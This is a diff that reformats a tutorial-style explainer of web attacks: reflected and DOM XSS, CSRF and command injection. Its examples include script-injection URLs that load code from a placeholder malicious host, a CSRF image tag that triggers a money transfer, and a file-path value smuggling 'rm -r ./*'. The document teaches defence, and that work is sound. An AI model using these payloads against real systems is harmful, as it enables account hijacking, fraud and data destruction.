@@ -59,14 +59,19 @@ Its principle is the same as Persistent XSS, attacker try to get user's personal
 by insert HTML tag.
 
 For example, there is a error page who shows error messages from the server by url, like 
-`http://www.some-page.com/error?message=Page%20not%20found`, the content in `message` will be showed in 
-HTML, like:
+
+`http://www.some-page.com/error?message=Page%20not%20found`
+
+the content in `message` will be showed in HTML, like:
 
 ```html
 <p>Page not found</p>
 ```
 
-If an attack inputs an URL like `http://www.some-page.com/error?message=<script src="http://www.malicious-site.com/code"></script>`,
+If an attack inputs an URL like 
+
+`http://www.some-page.com/error?message=<script src="http://www.malicious-site.com/code"></script>`
+
 The final HTML will become:
 
 ```html
@@ -87,7 +92,9 @@ which will leave a url record in the server request log.
 
 There is a simple example updated from last example of Reflected XSS:
 
-we can use a new url like:`http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E`.
+we can use a new url like:
+
+`http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E`
 
 The biggest difference is that we can use `location.hash` to inject malicious code to the page, which won't show the url after `#` in the 
 server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.
@@ -113,8 +120,11 @@ Like XSS, it may steal users' cookie.
 
 But their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.
 
-For example, there is a request `http://www.money.com?account=sender&amount=10000&for=receiver` to transfer money while 
-the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like 
+For example, there is a request 
+
+`http://www.money.com?account=sender&amount=10000&for=receiver` 
+
+to transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like 
 
 ```html
 <img src='http://www.money.com?account=sender&amount=10000&for=hacker'>
@@ -255,7 +265,11 @@ app.use.get('/gzip', (req, res)=>{
 });
 ```
 
-If some one input an URL like: `www.example.com/gzip?file_path=file.txt\rm -r ./*`, it may be a disaster.
+If some one input an URL like: 
+
+`www.example.com/gzip?file_path=file.txt\rm -r ./*`
+
+It may be a disaster.
 
 ### How to prevent 
 
